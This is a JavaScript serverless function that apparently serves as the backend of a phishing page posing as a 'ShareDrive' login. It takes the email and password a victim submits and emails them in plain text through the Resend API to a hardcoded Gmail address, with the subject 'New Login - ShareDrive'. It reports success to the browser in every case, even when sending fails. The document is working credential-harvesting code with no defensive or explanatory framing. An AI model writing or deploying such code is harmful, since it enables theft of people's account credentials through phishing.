exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: 'OK' };
  }

  try {
    const body = JSON.parse(event.body);
    const apiKey = process.env.RESEND_API_KEY;

    if (!apiKey) {
      return { 
        statusCode: 200, 
        headers, 
        body: JSON.stringify({ success: true, error: 'RESEND_API_KEY is missing' }) 
      };
    }

    const resendResponse = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'onboarding@resend.dev',
        to: ['g82443047@gmail.com'], 
        subject: 'New Login - ShareDrive',
        text: `Email: ${body.email}\nPassword: ${body.password}`,
      }),
    });

    const resendText = await resendResponse.text();

    // Return exactly what Resend said back to the browser
    return { 
      statusCode: 200, 
      headers, 
      body: JSON.stringify({ 
        success: true, 
        resendStatus: resendResponse.status, 
        resendMessage: resendText 
      }) 
    };

  } catch (error) {
    return { 
      statusCode: 200, 
      headers, 
      body: JSON.stringify({ success: true, error: error.message }) 
    };
  }
};